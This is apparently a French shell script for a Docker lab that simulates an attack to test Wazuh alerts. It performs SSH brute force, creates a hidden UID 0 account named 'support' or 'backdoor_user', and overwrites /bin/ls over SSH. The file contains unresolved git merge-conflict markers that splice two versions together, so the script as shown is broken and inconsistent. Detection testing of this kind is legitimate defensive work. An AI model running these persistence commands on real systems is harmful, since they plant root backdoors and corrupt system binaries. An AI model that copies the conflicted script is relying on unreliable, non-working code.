#!/bin/sh
# Epreuve du feu : attaque simulee, 100 % Docker, rien a installer sur l'hote.
# Usage : ./scenario.sh [brute|persist|reset|all]   (par defaut : all)
set -e
cd "$(dirname "$0")"

# Le conteneur "attacker" est dans le profil "demo"
DC="docker compose --profile demo"

<<<<<<< Updated upstream
brute() {
  echo "[1/2] Brute force SSH depuis le conteneur attacker vers webserver"
  $DC up -d attacker
  for i in 1 2 3 4 5 6; do
    echo "  tentative $i (utilisateur faux$i)"
    $DC exec -T attacker ssh -o BatchMode=yes -o StrictHostKeyChecking=no \
      -o ConnectTimeout=3 "faux$i@webserver" true 2>/dev/null || true
    sleep 1
  done
  echo "  -> attendu : alerte 100120 (niveau 12) + mail + IP de l'attaquant bloquee"
}
=======
TARGET_IP="127.0.0.1"
SSH_PORT="2222"
USERNAME="webadmin"
>>>>>>> Stashed changes

persist() {
  echo "[2/2] Persistance : utilisateur cache avec UID 0 dans webserver"
  $DC exec -T webserver useradd -o -u 0 -g 0 -M -s /bin/bash support
  echo "  -> attendu : alerte FIM 100100 (niveau 12) sur /etc/passwd"
}

reset() {
  echo "Remise a zero : suppression de l'utilisateur cache et deblocage de l'IP"
  $DC exec -T webserver userdel support 2>/dev/null || true
  $DC exec -T webserver iptables -F INPUT 2>/dev/null || true
}

<<<<<<< Updated upstream
case "${1:-all}" in
  brute)   brute ;;
  persist) persist ;;
  reset)   reset ;;
  all)     brute; sleep 5; persist ;;
  *)       echo "Usage : $0 [brute|persist|reset|all]"; exit 1 ;;
esac

echo "Resultat : mails sur http://127.0.0.1:8025, alertes dans le dashboard Wazuh."
=======
# --- 2. CREATION D'UN UTILISATEUR ROOT CLANDESTIN ---
echo -e "\n[2/3] Création d'un utilisateur avec l'UID 0 (Root)..."
# On utilise la clé SSH générée à l'étape précédente pour se connecter
ssh -o StrictHostKeyChecking=no -p $SSH_PORT $USERNAME@$TARGET_IP "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor_user"
echo "[+] Utilisateur 'backdoor_user' créé."
sleep 5

# --- 3. MODIFICATION D'UN BINAIRE SYSTEME ---
echo -e "\n[3/3] Modification du binaire système /bin/ls..."
ssh -o StrictHostKeyChecking=no -p $SSH_PORT $USERNAME@$TARGET_IP "cp /bin/ls /tmp/ls.bak && echo -e '#!/bin/bash\necho \"Binaire compromis\"' > /bin/ls && chmod +x /bin/ls"
echo "[+] Binaire /bin/ls modifié."

echo -e "\n====================================================="
echo "   FIN DE L'EPREUVE DU FEU"
echo "====================================================="
                                                                                                                                                                                                                                            
>>>>>>> Stashed changes
